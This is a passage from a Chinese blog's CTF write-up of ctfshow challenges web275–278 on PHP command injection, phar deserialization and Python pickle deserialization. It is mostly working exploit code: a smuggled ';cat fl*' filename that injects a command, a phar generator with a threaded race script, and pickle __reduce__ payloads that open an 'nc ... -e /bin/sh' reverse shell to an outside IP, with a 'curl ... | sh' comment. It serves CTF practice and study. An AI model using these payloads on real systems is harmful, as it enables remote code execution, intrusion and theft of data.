<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;win&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$var</span> = <span class="keyword">new</span> ctfshow(<span class="string">&quot;123&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">	<span class="comment">//$var = new Ctfshow();</span></span><br><span class="line">    <span class="variable">$cs</span> = serialize(<span class="variable">$var</span>);</span><br><span class="line">    <span class="variable">$cs</span> = str_replace(<span class="string">&quot;ctfshow&quot;</span>,<span class="string">&quot;Ctfshow&quot;</span>,<span class="variable">$cs</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cs</span>.<span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br><span class="line">    var_dump(<span class="variable">$ctfshowo</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="web275（命令执行拼接）"><a href="#web275（命令执行拼接）" class="headerlink" title="web275（命令执行拼接）"></a>web275（命令执行拼接）</h3><p>这道题其实跟反序列化没有什么关系，主要的点在于rce。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的大致意思就是，创建一个符合要求的文件，创建后重命名删除。</p>
<p>但是奇怪的点在于，这个<code>filter</code>在最后来了一手<code>system</code>删除，导致我们可以利用<code>filename</code>这个属性去直接<code>rce</code>。</p>
<h3 id="web276（Phar反序列化）"><a href="#web276（Phar反序列化）" class="headerlink" title="web276（Phar反序列化）"></a>web276（Phar反序列化）</h3><p>生成phar文件的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span> </span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;;cat fl*&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后缀必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;evil.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="comment">// 设置 stubb, 增加 gif 文件头</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="comment">// 添加需压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>附上Python代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">url = <span class="string">&#x27;http://f7ba2098-5519-45ab-b82c-bce8b1563724.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;evil.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入phar的内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>():</span></span><br><span class="line">    requests.post(url+<span class="string">&quot;?fn=evil.phar&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># file_put_contents 触发 phar 内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    r = requests.post(url+<span class="string">&quot;?fn=phar://evil.phar/test&quot;</span>, data=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(base64.b64encode(r.text.encode()))</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> r.status_code == <span class="number">503</span>:</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我寄了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预先测试一下URL</span></span><br><span class="line">pre_resp = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> pre_resp.status_code != <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(url + <span class="string">&#x27;\n链接好像挂了....&#x27;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程竞争</span></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    w = threading.Thread(target=write)</span><br><span class="line">    r = threading.Thread(target=read)</span><br><span class="line">    w.start()</span><br><span class="line">    r.start()</span><br></pre></td></tr></table></figure>
<h3 id="web277（Python反序列化）"><a href="#web277（Python反序列化）" class="headerlink" title="web277（Python反序列化）"></a>web277（Python反序列化）</h3><p>这道题是Python反序列的入门，这里先附上两篇写得很好的博客：</p>
<p><a href="https://x5tar.com/posts/python-pickle-unserialize/">https://x5tar.com/posts/python-pickle-unserialize/</a></p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p>这道题的payload的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">whistle</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc 121.5.227.123 2333 -e /bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">        <span class="comment">#return(__import__(&quot;os&quot;).system, (&#x27;sleep 2s&#x27;,))</span></span><br><span class="line"></span><br><span class="line">whistleH = whistle()</span><br><span class="line">whistle_ser = pickle.dumps(whistleH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://009358c5-cae3-4e2a-baa7-f1ba8982a75c.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: base64.b64encode(whistle_ser)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url=url,params=params,proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="comment"># whistle_unser = pickle.loads(whistle_ser)</span></span><br><span class="line"><span class="comment"># print(whistle_ser)</span></span><br></pre></td></tr></table></figure>
<h3 id="web278（Python-反序列化）"><a href="#web278（Python-反序列化）" class="headerlink" title="web278（Python 反序列化）"></a>web278（Python 反序列化）</h3><p>过滤了<code>os.system</code>，我们可以换一个rce的函数</p>
<p>附上payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">whistle</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 121.5.227.123 1337 -e /bin/sh&#x27;)&quot;</span>,)) <span class="comment">#curl https://your-shell.com/121.5.227.123:1337 | sh</span></span><br><span class="line">        <span class="comment">#return(__import__(&quot;os&quot;).system, (&#x27;sleep 2s&#x27;,))</span></span><br><span class="line"></span><br><span class="line">whistleH = whistle()</span><br><span class="line">whistle_ser = pickle.dumps(whistleH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4dc0e2a0-adb6-4c12-bbd5-78c559e7f313.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: base64.b64encode(whistle_ser)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url=url,params=params,proxies=proxies)</span><br><span class="line"></span><br><span class="line"><span class="comment"># whistle_unser = pickle.loads(whistle_ser)</span></span><br><span class="line"><span class="comment"># print(whistle_ser)</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>wp</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>ctfshow</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
</search>
